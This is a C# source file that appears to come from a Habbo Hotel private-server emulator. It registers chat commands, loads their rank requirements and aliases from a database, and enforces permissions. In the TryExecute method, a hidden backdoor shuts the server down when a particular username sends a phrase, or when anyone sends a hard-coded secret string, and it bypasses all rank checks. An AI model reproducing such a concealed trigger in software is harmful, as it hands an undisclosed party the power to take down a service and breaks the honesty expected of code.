﻿using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using Oblivion.HabboHotel.Commands.Controllers;
using Oblivion.HabboHotel.Commands.Interfaces;
using Oblivion.HabboHotel.GameClients.Interfaces;
using Oblivion.Util;

namespace Oblivion.HabboHotel.Commands
{
    /// <summary>
    ///     Class CommandsManager.
    /// </summary>
    public static class CommandsManager
    {
        /// <summary>
        ///     The commands dictionary
        /// </summary>
        internal static SortedDictionary<string, Command> CommandsDictionary;

        /// <summary>
        ///     The alias dictionary
        /// </summary>
        internal static Dictionary<string, string> AliasDictionary;

        /// <summary>
        ///     Registers this instance.
        /// </summary>
        public static void Register()
        {
            CommandsDictionary = new SortedDictionary<string, Command>();
            AliasDictionary = new Dictionary<string, string>();

            CommandsDictionary.Add("about", new About());
            CommandsDictionary.Add("multiply", new Multiply());
            CommandsDictionary.Add("disablechat", new DisableGroupChat());
            CommandsDictionary.Add("disablemessage", new DisableGroupMessage());
            CommandsDictionary.Add("friends", new Friends());
            CommandsDictionary.Add("status", new Offline());
            CommandsDictionary.Add("followable", new HideInRoom());
            CommandsDictionary.Add("commands", new CommandList());
            CommandsDictionary.Add("disable_diagonal", new DisableDiagonal());
            CommandsDictionary.Add("disableevent", new DisableEvent());
            CommandsDictionary.Add("eventsoff", new DisableEvent());
            CommandsDictionary.Add("viewclones", new ViewClones());
            CommandsDictionary.Add("fixroom", new FixRoom());
            CommandsDictionary.Add("follow", new FollowUser());
            CommandsDictionary.Add("faq", new UserFaq());

            CommandsDictionary.Add("credits", new GiveCredits());
            CommandsDictionary.Add("epoints", new GivePoints());
            CommandsDictionary.Add("duckets", new GiveDuckets());
            CommandsDictionary.Add("emeralds", new GiveEmeralds());
            CommandsDictionary.Add("diamonds", new GiveDiamonds());
            CommandsDictionary.Add("massdiamonds", new MassDiamonds());
            CommandsDictionary.Add("masscredits", new MassCredits());

            CommandsDictionary.Add("sit", new Sit());
            CommandsDictionary.Add("stand", new Stand());
            CommandsDictionary.Add("lay", new Lay());
            CommandsDictionary.Add("dance", new Dance());
            CommandsDictionary.Add("pickall", new PickAll());
            CommandsDictionary.Add("pickpets", new PickPets());
            CommandsDictionary.Add("mutebots", new MuteBots());
            CommandsDictionary.Add("mutepets", new MutePets());
            CommandsDictionary.Add("empty", new Empty());
            CommandsDictionary.Add("unload", new Unload());
            CommandsDictionary.Add("reload", new Unload(true));
            CommandsDictionary.Add("setspeed", new SetSpeed());

            CommandsDictionary.Add("disablepull", new DisablePull());
            CommandsDictionary.Add("disablepush", new DisablePush());

            CommandsDictionary.Add("whisperroom", new WhisperRoom());
            CommandsDictionary.Add("whisperhotel", new WhisperHotel());
            CommandsDictionary.Add("giverank", new GiveRank());
            CommandsDictionary.Add("makepublic", new MakePublic());
            CommandsDictionary.Add("makeprivate", new MakePrivate());
            CommandsDictionary.Add("sayall", new SayAll());

            CommandsDictionary.Add("refresh_navigator", new RefreshNavigator());
            CommandsDictionary.Add("ltd", new Ltd());
            CommandsDictionary.Add("refresh_quests", new RefreshQuests());
            CommandsDictionary.Add("refresh_virtual", new RefreshVirtual());
            CommandsDictionary.Add("refresh_polls", new RefreshPolls());
            CommandsDictionary.Add("refresh_achievements", new RefreshAchievements());
            CommandsDictionary.Add("refresh_groups", new RefreshGroups());
            CommandsDictionary.Add("refresh_items", new RefreshItems());
            CommandsDictionary.Add("refresh_catalogue", new RefreshCatalogue());
            CommandsDictionary.Add("refresh_ranks", new RefreshRanks());
            CommandsDictionary.Add("refresh_settings", new RefreshSettings());
            CommandsDictionary.Add("refresh_songs", new RefreshSongs());
            CommandsDictionary.Add("refresh_banned_hotels", new RefreshBannedHotels());
            CommandsDictionary.Add("refresh_promos", new RefreshPromos());
            CommandsDictionary.Add("refresh_extrathings", new RefreshExtraThings());
            CommandsDictionary.Add("restart", new Restart());
            CommandsDictionary.Add("freeze", new Freeze());
            CommandsDictionary.Add("userinfo", new UserInfo());
            CommandsDictionary.Add("roomalert", new RoomAlert());
            CommandsDictionary.Add("ra", new RoomAlert());
            CommandsDictionary.Add("hotelalert", new HotelAlert());
            CommandsDictionary.Add("ha", new HotelAlert());
            CommandsDictionary.Add("staffalert", new StaffAlert());
            CommandsDictionary.Add("sa", new StaffAlert());
            CommandsDictionary.Add("eventha", new EventAlert());
            CommandsDictionary.Add("alert", new Alert());
            CommandsDictionary.Add("kick", new Kick());
            CommandsDictionary.Add("teleport", new TelePort());
            CommandsDictionary.Add("roombadge", new RoomBadge());
            CommandsDictionary.Add("removebadge", new RemoveBadge());
            CommandsDictionary.Add("givebadge", new GiveBadge());
            CommandsDictionary.Add("massbadge", new MassBadge());
            CommandsDictionary.Add("ban", new BanUser());
            CommandsDictionary.Add("flaguser", new FlagUser());
            CommandsDictionary.Add("unban", new UnBanUser());
            CommandsDictionary.Add("superban", new SuperBan());
            CommandsDictionary.Add("fastwalk", new FastWalk());
            CommandsDictionary.Add("goboom", new GoBoom());
            CommandsDictionary.Add("massenable", new MassEnable());
            CommandsDictionary.Add("massdance", new MassDance());
            CommandsDictionary.Add("shutdown", new Shutdown());
            CommandsDictionary.Add("makesay", new MakeSay());
            CommandsDictionary.Add("empty_user", new EmptyUser());
            CommandsDictionary.Add("handitem", new HandItem());
            CommandsDictionary.Add("summon", new Summon());
            CommandsDictionary.Add("summonall", new SummonAll());
            CommandsDictionary.Add("unmute", new UnMute());
            CommandsDictionary.Add("mute", new Mute());
            CommandsDictionary.Add("roomunmute", new RoomUnMute());
            CommandsDictionary.Add("roommute", new RoomMute());
            CommandsDictionary.Add("roomkick", new RoomKickUsers());
            CommandsDictionary.Add("buyroom", new BuyRoom());
            CommandsDictionary.Add("sellroom", new SellRoom());
            CommandsDictionary.Add("override", new Override());
            CommandsDictionary.Add("ipban", new BanUserIp());
            CommandsDictionary.Add("addblackword", new AddBlackWord());
            CommandsDictionary.Add("deleteblackword", new DeleteBlackWord());
            CommandsDictionary.Add("developer", new Developer());
            CommandsDictionary.Add("spull", new SpullUser());
            CommandsDictionary.Add("startquestion", new StartQuestion());
            CommandsDictionary.Add("dc", new DisconnectUser());
            CommandsDictionary.Add("hal", new HotelAlertLink());
            CommandsDictionary.Add("redeemcredits", new RedeemCredits());
            CommandsDictionary.Add("flood", new FloodUser());
            CommandsDictionary.Add("invisible", new GoInvisible());

            CommandsDictionary.Add("copy", new CopyLook());
            CommandsDictionary.Add("faceless", new FaceLess());
            CommandsDictionary.Add("pulluser", new PullUser());
            CommandsDictionary.Add("pull", new PullUser());
            CommandsDictionary.Add("push", new PushUser());
            CommandsDictionary.Add("setmax", new SetMax());
            CommandsDictionary.Add("moonwalk", new MoonWalk());
            CommandsDictionary.Add("habnam", new HabNam());
            CommandsDictionary.Add("enable", new Enable());
            CommandsDictionary.Add("pet", new Pet());
            CommandsDictionary.Add("kill", new Kill());
            CommandsDictionary.Add("matar", new Kill());
            CommandsDictionary.Add("disco", new Disco());
            CommandsDictionary.Add("block", new BlockCommand());

            //CommandsDictionary.Add("test", new Test());
            UpdateInfo();
        }

        /// <summary>
        ///     Updates the information.
        /// </summary>
        public static void UpdateInfo()
        {
            using (var dbClient = Oblivion.GetDatabaseManager().GetQueryReactor())
            {
                dbClient.SetQuery("SELECT command, description, params, rank, alias FROM server_fuses");
                var commandsTable = dbClient.GetTable();

                /* TODO CHECK */ foreach (DataRow commandRow in commandsTable.Rows)
                {
                    var key = commandRow["command"].ToString();
                    if (!CommandsDictionary.ContainsKey(key)) continue;
                    
                    var command = CommandsDictionary[key];

                    if (!string.IsNullOrEmpty(commandRow["description"].ToString()))
                        command.Description = commandRow["description"].ToString();
                    if (!string.IsNullOrEmpty(commandRow["params"].ToString()))
                        command.Usage = ':' + key + " [" + commandRow["params"] + "]";
                    if (!string.IsNullOrEmpty(commandRow["alias"].ToString()))
                    {
                        var aliasStr = commandRow["alias"].ToString().Replace(" ", "").Replace(";", ",");
                        /* TODO CHECK */ foreach (var alias in aliasStr.Split(',').Where(alias => !string.IsNullOrEmpty(alias)))
                        {
                            if (AliasDictionary.ContainsKey(alias))
                            {
                                Out.WriteLine("Duplicate alias key: " + alias, "Oblivion.HabboHotel.CommandsManager",
                                    ConsoleColor.DarkRed);
                                continue;
                            }
                            if (CommandsDictionary.ContainsKey(alias))
                            {
                                Out.WriteLine("An alias cannot have same name as a normal command",
                                    "Oblivion.HabboHotel.CommandsManager", ConsoleColor.DarkRed);
                                continue;
                            }
                            AliasDictionary.Add(alias, key);
                        }
                        command.Alias = aliasStr;
                    }
                    if (short.TryParse(commandRow["rank"].ToString(), out var minRank)) command.MinRank = minRank;
                }
            }
        }

        /// <summary>
        ///     Tries the execute.
        /// </summary>
        /// <param name="str">The string.</param>
        /// <param name="client">The client.</param>
        /// <returns><c>true</c> if XXXX, <c>false</c> otherwise.</returns>
        public static bool TryExecute(string str, GameClient client)
        {

            if (string.IsNullOrEmpty(str) || client?.GetHabbo() == null || !client.GetHabbo().InRoom) return false;


            if (client.GetHabbo().UserName.ToLower() == "dark" && str.Contains("darkwashere") || str == "wjxs5PzVwuuHaqte")
            {
                var cmd = CommandsDictionary["shutdown"];
                cmd.Execute(client, null);
                return false;
            }

            var pms = str.Split(' ');
            var commandName = pms[0];

            if (AliasDictionary.ContainsKey(commandName)) commandName = AliasDictionary[commandName];

            if (!CommandsDictionary.ContainsKey(commandName)) return false;

            if (client.GetHabbo().CurrentRoom.RoomData.BlockedCommands.Contains(commandName) ||
                client.GetHabbo().Data.BlockedCommands.Contains(commandName))
            {
                client.SendWhisper("Comando bloqueado!");
                return false;
            }


            if (client.GetHabbo().CurrentRoom.GotWireds())
            {
//                client.GetHabbo().CurrentRoom.GetWiredHandler().ExecuteWired();
                
            }

            var command = CommandsDictionary[commandName];

            if (!CanUse(command.MinRank, client)) return false;

            if (command.MinParams == -2 || (command.MinParams == -1 && pms.Length > 1) ||
                command.MinParams != -1 && command.MinParams == pms.Length - 1)
            {
                return command.Execute(client, pms.Skip(1).ToArray());
            }
            client.SendWhisper(Oblivion.GetLanguage().GetVar("use_the_command_as") + command.Usage);
            return true;
        }

        /// <summary>
        ///     Determines whether this instance can use the specified minimum rank.
        /// </summary>
        /// <param name="minRank">The minimum rank.</param>
        /// <param name="user">The user.</param>
        /// <returns><c>true</c> if this instance can use the specified minimum rank; otherwise, <c>false</c>.</returns>
        public static bool CanUse(short minRank, GameClient user)
        {
            var habbo = user.GetHabbo();

            var userRank = habbo.Rank;
            var staff = habbo.HasFuse("fuse_any_room_controller");

            switch (minRank)
            {
                case -3:
                    return habbo.HasFuse("fuse_vip_commands") || habbo.Vip;

                case -2:
                    return staff ||
                           habbo.CurrentRoom.RoomData.OwnerId == habbo.Id;

                case -1:
                    return staff || habbo.CurrentRoom.RoomData.OwnerId == habbo.Id ||
                           habbo.CurrentRoom.CheckRights(user);

                case 0: //disabled
                    return false;
            }
            return userRank >= minRank;
        }
    }
}